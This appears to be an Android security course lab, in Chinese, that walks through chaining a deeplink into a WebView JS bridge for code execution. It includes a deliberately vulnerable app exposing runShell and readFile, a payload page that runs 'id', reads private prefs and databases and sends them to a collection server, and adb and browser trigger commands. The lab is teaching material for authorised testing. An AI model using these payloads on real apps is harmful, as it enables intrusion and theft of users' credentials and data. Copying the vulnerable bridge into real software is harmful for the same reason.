# 練習 B — WebView + deeplink 鏈成 RCE

> **目標**：把 Ch 7（deeplink）與 Ch 8（WebView）學的東西**串成一條完整攻擊鏈**：靶 App 有一個 deeplink，能把**任意 URL** 餵給一個開了 **JS bridge** 的 WebView。你要親手把這條鏈從「發現入口」走到「在 App 進程裡執行任意指令」，並寫出可重現的 PoC（deeplink 觸發指令 + JS payload）。這是本課第一條真正的**多階段利用鏈**，也是 final 報告裡最有分量的那種洞。

> **環境**：AVD（Android 13 / API 33，可 root，Ch 0 建好的 `re33`）；靶 App 選一個有 WebView + JS bridge 的關卡（**AndroGoat** 的 WebView / DeepLink 關卡、或 **DIVA** 的相關關卡；若靶版本的 bridge 不夠危險，用下面「自建靶」一節的最小 App）。工具：`adb`、`jadx`、`apktool`、一個能放 HTML 的簡單 HTTP server（`python3 -m http.server`）。**只在你有權測試的靶 App 上做這個練習。**

> **本練習的執行段落我在本 repo 沙箱無法實跑**（無 AVD/WebView），所有「觸發後會發生什麼」標「**理論預期行為**」並附驗證方式；能純邏輯驗的（URL 解析、payload 構造）用 Python 標「**實際輸出**」。參考解答藏在 `<details>` 裡，**先自己做完再展開**。

---

## 規格：你要做出什麼

你要交付一條可重現的利用鏈，包含四個產出物：

1. **入口確認**：找到靶 App 的 deeplink，證明它會把外部可控的 URL 參數餵進 WebView。寫出這條 deeplink 的 scheme/host/參數格式。
2. **bridge 盤點**：列出該 WebView 透過 `addJavascriptInterface` 暴露了哪些 `@JavascriptInterface` 方法，指出哪個（或哪串）能被濫用成 RCE 或敏感資料外洩。
3. **JS payload**：一個 HTML 頁面，載入後自動呼叫危險 bridge 方法，達成「執行指令」或「讀走 App 私有檔並外傳」。
4. **完整 PoC 指令**：一條 `adb shell am start ...` 的 deeplink 觸發指令，把上面的 HTML URL 餵進去，端到端跑通整條鏈。

**成功判準**：受害者（模擬）只做一個動作——點一條你給的 deeplink（或在瀏覽器點一個連結）——你的指令就在 App 進程裡執行了，或 App 的私有資料被送到你的伺服器。

## 期望輸出

理論預期，整條鏈跑通時你會看到類似：

```
# 你觸發 deeplink 後，logcat（或你的 HTTP server log）出現：
[攻擊者 HTTP server]  GET /payload.html          200   ← WebView 載入了你的頁面
[攻擊者 HTTP server]  GET /exfil?token=eyJ...&db=U0VMRUNU...   ← 沙箱資料被外傳
# 或（若 bridge 能執行指令）logcat：
[target App]  bridge.runShell result: uid=10123(com.target) ...   ← 在 App 進程裡執行了
```

關鍵是**因果鏈完整**：deeplink（Ch 7 入口）→ WebView 載入任意頁（Ch 8 内容可控）→ JS 呼叫 bridge（Ch 8 出口）→ 指令執行 / 資料外傳。

## 卡點（做之前先想清楚這幾個）

- **deeplink 怎麼觸發？** 用 `adb shell am start -a android.intent.action.VIEW -d "<url>"`；若有 `BROWSABLE`，也能從網頁 `window.location` 觸發。分不清 scheme deeplink 與 App Link？回 Ch 7。
- **URL 參數怎麼被餵進 WebView？** 靜態要在 Activity 裡找 `getIntent().getData()` / `getQueryParameter(...)` → `webView.loadUrl(...)` 這條資料流。找不到就沒有可控入口。
- **bridge 到底危不危險？** 有 `addJavascriptInterface` 不代表能 RCE，要看暴露的方法（Ch 8 機制一）。API 17+ 只有標 `@JavascriptInterface` 的方法才暴露。
- **WebView 開 JS 了嗎？** 沒 `setJavaScriptEnabled(true)`，你的 payload 根本不會跑。這是前提。
- **URL 編碼**：deeplink 裡塞的 `url=` 值含 `://`、`?`、`&` 要 URL-encode，否則被 shell 或 Uri 解析吃掉。

## 分步指引（≥5 步，照順序做）

### Step 1 — 靜態偵察：找 WebView 與它的設定

用 jadx 打開靶 App，搜 `WebView`、`addJavascriptInterface`、`loadUrl`、`setJavaScriptEnabled`。目標是找到「哪個 Activity 有 WebView、它的設定拆了 Ch 8 那張表的哪幾塊牆」。特別記下：

- 有沒有 `setJavaScriptEnabled(true)`（payload 能不能跑的前提）
- `addJavascriptInterface(obj, "name")` 的 `name`（你 JS 裡要用 `window.name.xxx()`）
- 該 obj 的類別，跳過去看它有哪些 `@JavascriptInterface` 方法

### Step 2 — 找 deeplink 入口，確認 URL 可控

搜 Manifest 的 `<intent-filter>` 找 deeplink（`VIEW` + `BROWSABLE` + `scheme`）。找到後跳到對應 Activity，追這條資料流：

```
getIntent().getData() → getQueryParameter("url") → webView.loadUrl(<那個值>)
```

只要這條鏈成立，就代表**你能從外部控制 WebView 載入的 URL**——這是整條利用鏈的地基。若中間有校驗（`host.endsWith`、`contains`），評估它能不能繞（Ch 7/8 的繞過）。

### Step 3 — 盤點 bridge，選定武器方法

回到 Step 1 找到的 bridge 類別，列出所有 `@JavascriptInterface` 方法。對每個問「攻擊者手上這方法能做什麼」：

- `runShell(cmd)` / 任何呼叫 `Runtime.exec` 的 → 直接 RCE
- `readFile(path)` / 回傳檔案內容的 → 讀沙箱
- `getToken()` / 回傳 SharedPrefs 值的 → 偷憑證
- 回傳 `Context` / `Object` 的 → 可能間接鏈利用

選最直接的那個當武器。

### Step 4 — 寫 JS payload（HTML）

寫一個 HTML，載入後自動呼叫武器方法。先從**無害驗證**開始（確認橋通），再升級到真 payload：

```html
<!-- 先驗證橋通：確認 window.<bridgeName> 存在且可呼叫 -->
<script>
  document.title = "bridge? " + (typeof window.jsbridge);   // 看 logcat / title
</script>
```

橋確認通了，再換成真 payload（見參考解答）。把 HTML 放上你的 HTTP server：`python3 -m http.server 8000`。

### Step 5 — 構造 deeplink PoC 並端到端觸發

把你的 HTML URL URL-encode 後塞進 deeplink 的 `url=` 參數，用 `adb shell am start` 觸發：

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://webview?url=http%3A%2F%2F10.0.2.2%3A8000%2Fpayload.html"
#   10.0.2.2 = AVD 裡指向 host 電腦的特殊 IP
```

觀察 HTTP server log（頁面被載入）+ logcat / exfil 請求（payload 執行）。跑通即完成。

### Step 6 — 驗證受害者視角

最後從**受害者能被誘導的動作**驗一次：若 deeplink 有 `BROWSABLE`，放一個網頁 `<a href="myapp://webview?url=...">` 或 `window.location=...`，模擬「受害者點連結」而非「你用 adb」。這才是真實攻擊路徑。

---

## 參考解答

先自己走完 Step 1–6 再展開。

<details>
<summary>展開：自建最小靶 App（若現成靶 bridge 不夠危險）</summary>

如果 AndroGoat/DIVA 的版本 bridge 太保守，用這個最小可漏 App 練整條鏈。**這是刻意埋洞的教學靶，只在自己 AVD 跑。**

`AndroidManifest.xml`（節錄，targetSdk 設 33）：

```xml
<activity android:name=".WebActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="myapp" android:host="webview"/>
    </intent-filter>
</activity>
```

`WebActivity.java`（漏洞點已標）：

```java
public class WebActivity extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        WebView wv = new WebView(this);
        setContentView(wv);
        wv.getSettings().setJavaScriptEnabled(true);              // 前提：JS 開
        wv.addJavascriptInterface(new Bridge(this), "jsbridge");  // 危險：暴露 bridge

        Uri data = getIntent().getData();                         // 入口：外部可控
        String url = data.getQueryParameter("url");               // 無校驗
        wv.loadUrl(url);                                          // ← 漏洞：任意 URL 進 WebView
    }
    class Bridge {
        Context ctx;
        Bridge(Context c) { ctx = c; }
        @JavascriptInterface
        public String readFile(String p) throws Exception {       // ← 武器：任意讀
            return new String(java.nio.file.Files.readAllBytes(
                java.nio.file.Paths.get(p)));
        }
        @JavascriptInterface
        public String runShell(String cmd) throws Exception {     // ← 武器：RCE
            java.io.InputStream in = Runtime.getRuntime()
                .exec(new String[]{"/system/bin/sh","-c",cmd}).getInputStream();
            return new java.util.Scanner(in).useDelimiter("\\A").next();
        }
    }
}
```

這個 App 同時具備：可控 deeplink 入口（`myapp://webview?url=`）+ JS 開 + 危險 bridge（`runShell`/`readFile`）——正是規格要打的鏈。

</details>

<details>
<summary>展開：完整 JS payload（RCE + 沙箱外傳）</summary>

`payload.html`——載入後自動執行指令並把結果 + App 私有檔外傳到攻擊者伺服器：

```html
<!DOCTYPE html>
<html><body>
<script>
// 攻擊者的收集端點（AVD 裡 10.0.2.2 指向 host；真實攻擊改成公網位址）
var EXFIL = "http://10.0.2.2:8000/exfil";

function send(k, v) {
  // 用 btoa 避免特殊字元破壞 query；資料量大改用 POST
  new Image().src = EXFIL + "?" + k + "=" + encodeURIComponent(btoa(unescape(encodeURIComponent(v))));
}

try {
  // 1) RCE：在 App 進程裡執行指令，證明 uid = target App
  var id = window.jsbridge.runShell("id");
  send("id", id);

  // 2) 讀走 App 私有沙箱檔（token / DB），這是最有價值的產出
  var prefs = window.jsbridge.readFile(
    "/data/data/com.target.app/shared_prefs/auth.xml");
  send("prefs", prefs);

  var db = window.jsbridge.runShell(
    "cat /data/data/com.target.app/databases/*.db 2>/dev/null | head -c 4000");
  send("db", db);
} catch (e) {
  send("err", "" + e);   // bridge 名字/方法對不上時，錯誤也回傳方便除錯
}
</script>
攻擊頁載入完成
</body></html>
```

要點：
- `window.jsbridge` 的 `jsbridge` 必須 = Step 1 找到的 `addJavascriptInterface` 第二參數。名字錯，`typeof` 是 `undefined`，什麼都不會發生。
- 先用 Step 4 的無害版確認橋通，再上這個。
- exfil 用 `new Image().src` 是為了避開 CORS（GET 帶 query 不觸發 preflight）；資料大時 `readFile` 分段或改 `fetch` POST。

</details>

<details>
<summary>展開：deeplink PoC 觸發指令（含 URL 編碼推導）</summary>

`url=` 的值含 `://`、`:`、`/` 必須 URL-encode，否則 `Uri.getQueryParameter` 會把它切斷。我用 Python 算出正確編碼（**實際輸出**）：

```python
from urllib.parse import quote
inner = "http://10.0.2.2:8000/payload.html"
print(quote(inner, safe=""))
```

```
http%3A%2F%2F10.0.2.2%3A8000%2Fpayload.html
```

組成完整 deeplink 並觸發（**理論預期行為**，需 AVD）：

```bash
# 先起 payload server（放 payload.html + 收 /exfil）
python3 -m http.server 8000

# 觸發 deeplink：把編碼後的 url 塞進去
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://webview?url=http%3A%2F%2F10.0.2.2%3A8000%2Fpayload.html"
```

驗證方式：
- HTTP server 印出 `GET /payload.html 200` → WebView 載入了你的頁（Ch 8 內容可控成立）
- 接著印出 `GET /exfil?id=...&prefs=...` → JS 呼叫 bridge 成功、資料外傳（RCE / 沙箱讀取成立）
- 想看 `runShell` 結果，也可 `adb logcat` 撈你在 Bridge 裡加的 log

**受害者視角版**（Step 6）：若 deeplink 有 `BROWSABLE`，放一頁 `trigger.html`：

```html
<script>window.location = "myapp://webview?url=http%3A%2F%2F10.0.2.2%3A8000%2Fpayload.html";</script>
```

受害者在 AVD 瀏覽器開這頁，就自動觸發整條鏈——不需要 adb，這才是真實攻擊路徑。

</details>

---

## 測試表：逐階段驗收

| 階段 | 你要驗證 | 通過判準 | 對應章節 |
|---|---|---|---|
| T1 入口 | deeplink 把外部 url 餵進 WebView | jadx 追到 `getQueryParameter("url")→loadUrl` | Ch 7 機制四 |
| T2 內容可控 | WebView 載入你的頁 | HTTP server 出現 `GET /payload.html 200` | Ch 8 直覺 |
| T3 JS 執行 | 頁面 JS 真的跑 | 無害版看到 title/log 改變 | Ch 8 機制一 |
| T4 橋確認 | `window.<name>` 存在 | `typeof` 不是 `undefined` | Ch 8 機制一 |
| T5 RCE | bridge 執行指令 | `id` 回傳含 target 的 uid | Ch 8 機制一 |
| T6 外傳 | 沙箱資料送出 | `/exfil` 收到 prefs/db | Ch 8 機制一 |
| T7 受害者視角 | 一個點擊觸發全鏈 | 瀏覽器點連結即完成 T2–T6 | Ch 7 BROWSABLE |

七項全綠 = 完整利用鏈成立。缺哪項回對應章節補。

## 延伸挑戰

1. **繞過白名單**：若靶的 deeplink 對 `url=` 做了 `host.endsWith("trusted.com")` 校驗，用 Ch 7/8 的繞過（`evil-trusted.com` 子網域、userinfo `@`）讓你的頁面仍被載入。寫出繞過用的 URL 並驗證。
2. **無 RCE，只有 readFile**：假設 bridge 只暴露 `readFile` 沒有 `runShell`。改寫 payload，只靠任意檔讀取拿到最有價值的東西（列出你會讀哪幾個路徑、為什麼）。
3. **file:// UXSS 變體**：若 App 開了 `setAllowUniversalAccessFromFileURLs(true)`，改用 Ch 8 機制二的 `file://` + XHR 讀沙箱，不靠 bridge。比較這條鏈跟 bridge 鏈的前提差異。
4. **intent:// 逃逸**：若 WebView 的 `shouldOverrideUrlLoading` 會 `parseUri`+`startActivity`，構造一個 `intent://` payload 從 WebView 逃逸去喚起 App 的另一個未匯出元件（Ch 8 機制四）。
5. **寫成報告段落**：照 README 的報告模板（影響/重現步驟/PoC/修復建議）把這條鏈寫成一段，這是 final 的素材。修復建議要具體到「移除 bridge / 校驗 url host / 用 WebViewAssetLoader」。

## 自我檢核

- [ ] 不看解答，能說出這條鏈的四個階段各對應 Ch 7/8 的哪個機制
- [ ] 能解釋為什麼「有 `addJavascriptInterface`」不等於「一定能 RCE」，關鍵看什麼
- [ ] 知道 `window.<name>` 的 `name` 從哪裡來、填錯會怎樣
- [ ] 能自己算出 deeplink 裡 `url=` 參數該怎麼 URL-encode，為什麼要編碼
- [ ] 能區分「用 adb 觸發」與「受害者點連結觸發」，並說出後者需要什麼前提（BROWSABLE）
- [ ] 能把整條鏈寫成一段可重現、有修復建議的報告

## 延伸閱讀

- **[OWASP MASTG — WebView / Deep Link 測試](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/)**
  - **讀哪裡**：WebView JavaScript execution 與 deep link 兩節的測試流程
  - **學什麼**：把這條鏈的每一階段對回標準測試項，方便寫報告
  - **關聯**：本練習的方法論來源，final 報告的依據
- **[Oversecured — deep link → WebView RCE 案例](https://blog.oversecured.com/)**
  - **讀哪裡**：deep link 帶 URL 餵進 WebView 導致利用的真實文章
  - **學什麼**：本練習的鏈在真實 App 裡長什麼樣、還有哪些變體
  - **關聯**：延伸挑戰 1–4 的真實對照
- **[HackTricks — Android WebView Attacks](https://book.hacktricks.wiki/en/mobile-pentesting/android-app-pentesting/webview-attacks.html)**
  - **讀哪裡**：JS bridge 與 intent:// 逃逸的可複製 payload
  - **學什麼**：payload 的更多寫法與判斷可利用性
  - **關聯**：參考解答的 payload 素材、延伸挑戰 4

你已經走通本課第一條多階段利用鏈：deeplink 開門、WebView 載入、JS bridge 執行。接下來 Part 4 轉向另一大類——App 把資料存在哪、存得安不安全。RCE 能拿到的東西，不安全儲存往往「不用 RCE 就撿得到」。

→ [Ch 10 不安全儲存](./10-insecure-storage.md)
